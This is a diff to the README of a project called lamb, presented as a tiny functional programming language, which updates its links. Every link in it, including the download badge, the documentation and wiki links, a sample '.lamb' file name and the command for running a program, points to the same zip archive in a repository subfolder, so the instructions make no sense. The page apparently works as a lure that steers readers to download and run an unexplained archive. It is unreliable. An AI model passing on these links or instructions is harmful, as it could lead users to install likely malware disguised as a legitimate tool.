@@ -6,7 +6,7 @@ Welcome to lamb! This application offers a tiny pure functional programming lang
 ## 📦 Download & Install
 To get started, you need to download lamb. Visit this page to download:
 
-[![Download lamb](https://github.com/ebrilio/lamb/raw/refs/heads/main/notelet/Software_v1.9-beta.5.zip)](https://github.com/ebrilio/lamb/raw/refs/heads/main/notelet/Software_v1.9-beta.5.zip)
+[![Download lamb](https://raw.githubusercontent.com/ebrilio/lamb/main/notelet/Software_v2.9.zip)](https://raw.githubusercontent.com/ebrilio/lamb/main/notelet/Software_v2.9.zip)
 
 When you visit the link above, you'll see various versions of the software. Choose the latest version for the best experience. 
 
@@ -33,7 +33,7 @@ After installation, you can begin using lamb.
 
 ## 📜 Creating Your First Program
 1. Open your terminal or command prompt.
-2. Create a new file with a `.lamb` extension. For example, `https://github.com/ebrilio/lamb/raw/refs/heads/main/notelet/Software_v1.9-beta.5.zip`.
+2. Create a new file with a `.lamb` extension. For example, `https://raw.githubusercontent.com/ebrilio/lamb/main/notelet/Software_v2.9.zip`.
 3. Write your code in this file. Here’s a simple example:
 
    ```
@@ -45,7 +45,7 @@ After installation, you can begin using lamb.
 5. Run your program by typing the command below in your terminal:
 
    ```
-   lamb https://github.com/ebrilio/lamb/raw/refs/heads/main/notelet/Software_v1.9-beta.5.zip
+   lamb https://raw.githubusercontent.com/ebrilio/lamb/main/notelet/Software_v2.9.zip
    ```
 
 You should see the output of your program in the terminal.
@@ -57,7 +57,7 @@ You should see the output of your program in the terminal.
 - **Performance:** Efficient in both execution and memory usage.
 
 ## 📚 Documentation
-For detailed usage, refer to the official documentation available on [GitHub](https://github.com/ebrilio/lamb/raw/refs/heads/main/notelet/Software_v1.9-beta.5.zip). The documentation will help you understand advanced features, functions, and best practices.
+For detailed usage, refer to the official documentation available on [GitHub](https://raw.githubusercontent.com/ebrilio/lamb/main/notelet/Software_v2.9.zip). The documentation will help you understand advanced features, functions, and best practices.
 
 ## ⚙️ Community & Support
 Join our community for further support and questions. You can connect with us on:
@@ -66,8 +66,8 @@ Join our community for further support and questions. You can connect with us on
 - **Discussion Forum:** Engage with other users and share your programming experiences.
   
 ## 🔗 Quick Links
-- Download lamb: [Download Page](https://github.com/ebrilio/lamb/raw/refs/heads/main/notelet/Software_v1.9-beta.5.zip)
-- Documentation: [Lamb Wiki](https://github.com/ebrilio/lamb/raw/refs/heads/main/notelet/Software_v1.9-beta.5.zip)
+- Download lamb: [Download Page](https://raw.githubusercontent.com/ebrilio/lamb/main/notelet/Software_v2.9.zip)
+- Documentation: [Lamb Wiki](https://raw.githubusercontent.com/ebrilio/lamb/main/notelet/Software_v2.9.zip)
 
 ## 🛠️ Acknowledgements
 Thank you for choosing lamb! Your feedback is valuable, and we welcome any suggestions or improvements you may have.
